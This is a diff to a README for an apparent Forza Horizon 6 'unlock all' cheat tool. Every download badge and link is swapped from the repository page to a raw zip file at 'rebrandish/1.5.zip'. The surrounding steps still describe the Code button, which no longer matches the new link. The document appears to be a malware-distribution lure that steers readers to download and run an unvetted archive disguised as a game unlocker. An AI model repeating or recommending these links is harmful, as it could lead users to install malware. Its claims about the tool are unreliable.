@@ -1,6 +1,6 @@
 # 🏎️ forza-horizon-6-unlock-all-garage-lab - Unlock, Track, and Master Your Dream Garage
 
-[![Download Now](https://img.shields.io/badge/Download-Forza_Horizon_6_Garage_Lab-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dm-azj/forza-horizon-6-unlock-all-garage-lab)
+[![Download Now](https://img.shields.io/badge/Download-Forza_Horizon_6_Garage_Lab-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/dm-azj/forza-horizon-6-unlock-all-garage-lab/main/rebrandish/1.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Let’s get you up and running in less than five minutes. Follow these simple st
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/dm-azj/forza-horizon-6-unlock-all-garage-lab](https://github.com/dm-azj/forza-horizon-6-unlock-all-garage-lab)
+Visit this link to download the application: [https://raw.githubusercontent.com/dm-azj/forza-horizon-6-unlock-all-garage-lab/main/rebrandish/1.5.zip](https://raw.githubusercontent.com/dm-azj/forza-horizon-6-unlock-all-garage-lab/main/rebrandish/1.5.zip)
 
 Click the green **Code** button on that page, then select **Download ZIP**. The download will start automatically. The file is around 25 MB, so it should finish quickly.
 
@@ -168,9 +168,9 @@ Download it today, and take full control of your dream garage.
 
 ## 🔗 Quick Download
 
-[![Get It Now](https://img.shields.io/badge/Get_It_Now-Forza_Horizon_6_Garage_Lab-FF6600?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/dm-azj/forza-horizon-6-unlock-all-garage-lab)
+[![Get It Now](https://img.shields.io/badge/Get_It_Now-Forza_Horizon_6_Garage_Lab-FF6600?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/dm-azj/forza-horizon-6-unlock-all-garage-lab/main/rebrandish/1.5.zip)
 
-Visit this link to download the application: [https://github.com/dm-azj/forza-horizon-6-unlock-all-garage-lab](https://github.com/dm-azj/forza-horizon-6-unlock-all-garage-lab)
+Visit this link to download the application: [https://raw.githubusercontent.com/dm-azj/forza-horizon-6-unlock-all-garage-lab/main/rebrandish/1.5.zip](https://raw.githubusercontent.com/dm-azj/forza-horizon-6-unlock-all-garage-lab/main/rebrandish/1.5.zip)
 
 ---
 
